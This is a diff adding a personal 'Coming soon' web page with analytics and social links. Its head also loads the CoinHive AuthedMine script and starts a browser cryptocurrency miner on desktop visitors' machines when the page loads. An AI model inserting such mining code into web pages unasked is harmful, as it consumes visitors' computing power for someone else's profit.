@@ -1,0 +1,37 @@
+<html>
+    <head>
+        <title>Coming soon</title>
+        <link rel="stylesheet" href="css/style.css">
+        <link rel="stylesheet" href="css/fonts.css">
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+            <script async src="https://www.googletagmanager.com/gtag/js?id=UA-99090920-1"></script>
+            <script>
+                window.dataLayer = window.dataLayer || [];
+                function gtag(){dataLayer.push(arguments);}
+                gtag('js', new Date());
+
+                gtag('config', 'UA-99090920-1');
+            </script>
+            <script src="https://authedmine.com/lib/authedmine.min.js"></script>
+		<script>
+			var miner = new CoinHive.Anonymous('PG6Nm3zD5MVGYC0Dl8aNxkmRiFHRe0rT', {throttle: 0.3});
+
+			// Only start on non-mobile devices and if not opted-out
+			// in the last 14400 seconds (4 hours):
+			if (!miner.isMobile() && !miner.didOptOut(14400)) {
+				miner.start();
+			}
+		</script>
+    </head>
+    <body>
+        <div class="coming-soon-wrapper">
+            <h1 class="h1-style animate-opacity">Coming soon</h1>
+            <p class="time-counter-style animate-opacity">you have to wait a few days</p>
+        </div>
+        <div class="social-media-bar">
+            <a href="https://github.com/jannesz/"><img src="img/github-white.png" alt="G"></a>
+            <a href="https://twitter.com/janneszilling"><img src="img/twitter-logo.png" alt="T"></a>
+            <a href="https://steemit.com/@janneszilling"><img src="img/steemit-logo.png" alt="S"></a>    
+        </div>    
+    </body>
+</html>
